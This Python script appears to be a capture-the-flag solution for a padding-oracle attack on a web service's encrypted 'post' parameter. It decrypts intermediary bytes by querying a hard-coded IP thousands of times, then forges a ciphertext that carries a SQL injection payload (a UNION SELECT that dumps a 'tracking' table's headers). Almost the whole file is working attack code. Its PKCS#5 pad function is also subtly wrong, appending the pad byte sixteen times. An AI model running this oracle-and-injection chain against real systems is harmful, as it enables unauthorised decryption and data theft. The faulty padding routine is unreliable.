import base64
import requests

def trans(s):
    return "b'%s'" % ''.join('\\x%.2x' % x for x in s)


def decode(data):
    return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))


def encode(data):
    return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')


def bxor(b1, b2): # use xor for bytes
    result = b""
    for b1, b2 in zip(b1, b2):
        result += bytes([b1 ^ b2])
    return result


def test(url, data):
    r = requests.get(url+'?post={}'.format(data))
    if 'PaddingException' in r.text:
        return False
    else:
        print(r.url)
        return True

def generate_iv_list(tail):
    iv = b'\x00' * (16 - len(tail) -1) 
    return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]


def padding_oracle_decrypt(url, data):
    print('破解数据：{}'.format(data))# Cracking the data
    index = 15
    intermediary = bytes()
    tail = bytes()
    while index >= 0:
        for iv in generate_iv_list(tail):
            print('尝试初始向量：{}'.format(trans(iv)))# Try the initial vector
            if test(url, encode(iv+data)):
                intermediary = bytes([(16-index) ^ iv[index]]) + intermediary
                index -= 1
                tail = bytes([temp ^ (16-index) for temp in intermediary])
                break
    return intermediary


def pad(data, block_size):
    """按PKCS#5填充"""# Fill by PKCS#5
    amount_to_pad = block_size - (len(data) % block_size)
    if amount_to_pad == 0:
        amount_to_pad = block_size
    pad = bytes([amount_to_pad])
    return data + pad * 16


if __name__ == '__main__':
    url = 'http://35.190.155.168/fc2fd7e530/'
    post = 'OQ9EaI4kACeslNOW5XuTWpnKWmjyduYd0CnPDOFVUNW6tmnWyxyj-ID-xbYIkUaXrg-F4T!!5!4cZxh738rhQ-1QhYP1GcIy-tx0HILgW9bqTiWFGCgrCqTJKoLfoKlXjRaLQrS2HjgktviFXT0BwFPxx29x7i1UxDdLeC7ZAVxvJ4WDvDyxzEc3vNxuRE5UB!dytTf!iY32Cpl8iiI7LQ~~'
    ciphertext = decode(post)[16*6:16*7]
    immediate = bxor(b'$FLAG$", "id": "', decode(post)[16*(1+4):16*(1+5)])

    plains = '{"id":"0 UNION SELECT group_concat(headers), \'\' from tracking","key":"XjPkmljch5E2sMiNhsNiqg~~"}'
    data = pad(plains.encode('utf-8'), 16)
    block_amount = int(len(data) / 16)
    index = block_amount
    while True:
        block = data[(index-1)*16: index*16]
        print('处理块：')# Processing block:
        print(block)
        iv = bxor(immediate, block)
        ciphertext = iv + ciphertext
        index -= 1
        if index > 0:
            immediate = padding_oracle_decrypt(url, iv)
        else:
            break
    print(encode(ciphertext))